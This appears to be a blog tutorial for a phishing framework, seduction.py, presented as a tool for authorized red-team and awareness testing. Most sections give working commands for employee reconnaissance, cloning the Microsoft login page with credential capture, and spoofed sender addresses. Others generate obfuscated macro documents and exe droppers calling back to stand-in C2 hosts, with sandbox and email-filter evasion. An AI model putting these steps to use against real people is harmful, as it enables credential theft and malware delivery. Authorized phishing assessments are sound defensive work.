---
layout: post
title: "The Psychology of Phishing: Building Campaigns with Seduction"
date: 2026-02-03
categories: [social-engineering, red-team]
tags: [seduction, phishing, social-engineering, security-awareness]
author: bad-antics
---

# The Psychology of Phishing: Building Campaigns with Seduction

Social engineering remains the most reliable attack vector. Technical controls improve, but human psychology doesn't patch. **seduction.py** provides a framework for authorized phishing assessments and security awareness testing—tools that defenders need to understand attacker methodologies.

> ⚠️ **Disclaimer**: This tool is for authorized security testing only. Unauthorized phishing is illegal. Always obtain written permission before conducting social engineering assessments.

## Understanding the Attack Surface

Before technical implementation, understand the psychological principles:

### Cialdini's Principles of Influence

| Principle | Phishing Application |
|-----------|---------------------|
| **Authority** | "IT Department requires immediate action" |
| **Urgency** | "Your account will be suspended in 24 hours" |
| **Social Proof** | "Your colleagues have already completed this" |
| **Reciprocity** | "Here's a free resource, just log in to download" |
| **Commitment** | "Confirm your previous agreement" |
| **Liking** | Impersonate trusted contacts or brands |

Seduction codifies these principles into campaign templates.

## Campaign Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    Seduction Framework                   │
├─────────────┬─────────────┬─────────────┬───────────────┤
│  Recon      │  Content    │  Delivery   │  Tracking     │
│  Module     │  Generator  │  Engine     │  Analytics    │
├─────────────┼─────────────┼─────────────┼───────────────┤
│ • OSINT     │ • Templates │ • SMTP      │ • Opens       │
│ • LinkedIn  │ • Cloning   │ • SMS       │ • Clicks      │
│ • Breaches  │ • Payloads  │ • Voice     │ • Credentials │
│ • Social    │ • Landing   │ • Physical  │ • Reports     │
└─────────────┴─────────────┴─────────────┴───────────────┘
```

## Getting Started

### Basic Phishing Campaign

```bash
# Initialize campaign
python seduction.py --new-campaign "Q1 Security Assessment" \
    --client "Acme Corp" --scope ./scope.txt

# Import target list
python seduction.py --campaign "Q1 Security Assessment" \
    --import-targets ./employees.csv

# Select template
python seduction.py --campaign "Q1 Security Assessment" \
    --template password-reset --brand microsoft

# Launch
python seduction.py --campaign "Q1 Security Assessment" \
    --launch --schedule "2026-02-10 09:00"
```

## Reconnaissance Integration

Effective phishing requires target intelligence:

```bash
# Gather OSINT on targets
python seduction.py --campaign "Q1 Assessment" \
    --recon --sources linkedin,hunter,breach-db

# Enrich target profiles
python seduction.py --campaign "Q1 Assessment" \
    --enrich --fields "department,manager,recent_posts"
```

Enriched data enables personalization:
- **Department-specific lures**: HR → benefits update, Finance → invoice review
- **Manager impersonation**: Emails appearing to come from direct supervisors
- **Interest-based pretexts**: Based on social media activity

## Template System

### Built-in Templates

```bash
# List available templates
python seduction.py --list-templates

# Preview template
python seduction.py --preview-template password-reset --brand google
```

Categories:
- **Credential Harvesting**: Password resets, MFA verification, account alerts
- **Payload Delivery**: Document macros, fake updates, "security tools"
- **Information Gathering**: Surveys, "verify your information" forms

### Custom Templates

```html
<!-- templates/custom/urgent_invoice.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Invoice Requires Attention</title>
</head>
<body style="font-family: Arial, sans-serif;">
    <div style="max-width: 600px; margin: 0 auto;">
        <img src="{{company_logo}}" alt="{{company_name}}" style="height: 50px;">
        
        <p>Dear {{first_name}},</p>
        
        <p>An invoice from <strong>{{vendor_name}}</strong> requires your approval 
        before processing. The payment deadline is <strong>{{deadline}}</strong>.</p>
        
        <p>Invoice Amount: <strong>${{amount}}</strong></p>
        
        <a href="{{tracking_url}}" style="background: #0066cc; color: white; 
           padding: 12px 24px; text-decoration: none; border-radius: 4px;">
            Review Invoice
        </a>
        
        <p style="color: #666; font-size: 12px; margin-top: 30px;">
            This is an automated message from {{company_name}} Finance.
        </p>
    </div>
</body>
</html>
```

Register custom template:
```bash
python seduction.py --register-template ./templates/custom/urgent_invoice.html \
    --name "Urgent Invoice" --category credential-harvest \
    --variables company_logo,company_name,first_name,vendor_name,deadline,amount
```

### Landing Page Cloning

Clone legitimate login pages:

```bash
# Clone a login page
python seduction.py --clone https://login.microsoftonline.com \
    --output ./landing_pages/microsoft/

# Add credential capture
python seduction.py --inject-capture ./landing_pages/microsoft/ \
    --redirect https://real-microsoft.com --method post
```

## Delivery Mechanisms

### Email (SMTP)

```bash
# Configure sending profile
python seduction.py --smtp-profile "assessment-sender" \
    --host smtp.example.com --port 587 \
    --user phish@example.com --password-file ./creds.txt \
    --from-name "IT Security Team" --from-email security@{{target_domain}}

# Send campaign
python seduction.py --campaign "Q1 Assessment" \
    --send --profile "assessment-sender" \
    --throttle 10/minute --jitter 30s
```

### SMS (Smishing)

```bash
# Configure SMS provider
python seduction.py --sms-profile "twilio" \
    --provider twilio --account-sid ${SID} --auth-token ${TOKEN}

# Send SMS campaign
python seduction.py --campaign "SMS Assessment" \
    --template sms-mfa-alert \
    --send-sms --profile "twilio"
```

### Voice (Vishing)

Generate voice scripts and track calls:

```bash
# Generate call script
python seduction.py --vishing-script --template helpdesk-callback \
    --target-info ./targets.json --output ./scripts/

# Log call outcomes
python seduction.py --log-call --campaign "Vishing Q1" \
    --target user@example.com --outcome "credentials_obtained" \
    --notes "User provided password after 'verification'"
```

## Payload Integration

### Macro Documents

```bash
# Generate macro-enabled document
python seduction.py --payload macro-doc \
    --template invoice.docx \
    --callback https://your-server.com/beacon \
    --output malicious_invoice.docm

# Obfuscate macro
python seduction.py --obfuscate ./malicious_invoice.docm \
    --technique string-concat,base64
```

### Executable Droppers

```bash
# Generate payload with evasion
python seduction.py --payload dropper \
    --format exe --callback https://c2.example.com \
    --evasion sandbox-detect,delayed-exec \
    --output update.exe
```

## Tracking and Analytics

### Real-time Dashboard

```bash
# Start tracking server
python seduction.py --track --port 443 --ssl \
    --domain phish-track.example.com

# View dashboard
python seduction.py --dashboard --campaign "Q1 Assessment"
```

### Metrics Tracked

- **Email opens** (tracking pixel)
- **Link clicks** (with timestamp and user-agent)
- **Credential submissions** (hashed for security)
- **Payload executions** (callback beacons)
- **Geographic data** (IP geolocation)

### Reporting

```bash
# Generate executive report
python seduction.py --report --campaign "Q1 Assessment" \
    --format pdf --template executive --output report.pdf

# Technical findings
python seduction.py --report --campaign "Q1 Assessment" \
    --format json --include-raw --output findings.json

# Awareness training recommendations
python seduction.py --report --campaign "Q1 Assessment" \
    --format html --template training-recommendations \
    --output training_needs.html
```

## Evasion Techniques

### Email Security Bypass

```bash
# Check deliverability before launch
python seduction.py --test-delivery --target test@client-domain.com \
    --template password-reset --verbose

# Common bypasses
python seduction.py --campaign "Q1 Assessment" \
    --send \
    --bypass-techniques \
        domain-age,           # Use aged domains
        spf-alignment,        # Proper SPF setup
        dkim-signing,         # Sign with DKIM
        link-obfuscation,     # Redirect through legitimate services
        payload-hosting       # Host payloads on trusted platforms
```

### Sandbox Evasion (Payloads)

```bash
python seduction.py --payload macro-doc \
    --evasion \
        mouse-movement,       # Require mouse activity
        time-delay,           # Wait before execution
        environment-check,    # Detect VM/sandbox
        domain-check          # Only execute on target network
```

## Multi-Stage Campaigns

Complex assessments often require multiple phases:

```yaml
# campaign_stages.yaml
campaign: "Advanced Persistent Phishing"
stages:
  - name: "Reconnaissance"
    duration: 7d
    actions:
      - recon: linkedin,social
      - identify: high-value-targets
      
  - name: "Initial Contact"
    duration: 3d
    actions:
      - template: benign-newsletter
      - goal: establish-familiarity
      
  - name: "Trust Building"
    duration: 7d
    actions:
      - template: useful-resource
      - content: legitimate-industry-report
      
  - name: "Credential Harvest"
    duration: 3d
    actions:
      - template: exclusive-webinar-registration
      - capture: credentials
```

```bash
python seduction.py --staged-campaign ./campaign_stages.yaml \
    --launch --monitor
```

## Defensive Insights

Every assessment should improve defenses:

```bash
# Generate defensive recommendations
python seduction.py --analyze --campaign "Q1 Assessment" \
    --output defense_gaps.md

# Identify users needing training
python seduction.py --at-risk-users --campaign "Q1 Assessment" \
    --threshold clicked --output training_list.csv

# Test email security controls
python seduction.py --test-controls --target-domain client.com \
    --controls spf,dkim,dmarc,gateway --report controls_assessment.pdf
```

## Conclusion

Social engineering assessments reveal the human element of security—often the weakest link. Seduction provides the technical framework, but effective campaigns require understanding psychology, maintaining ethics, and translating findings into actionable defenses.

Key principles:
1. **Authorization first**—Always have written permission
2. **Realism matters**—Generic phishing misses sophisticated users
3. **Track everything**—Metrics drive improvement
4. **Educate, don't shame**—The goal is awareness, not punishment

The best phishing assessment is one that never needs to be repeated because the organization learned from it.

---

*Framework documentation: [Seduction Tool Guide](/baudrillard-suite/tools/seduction)*
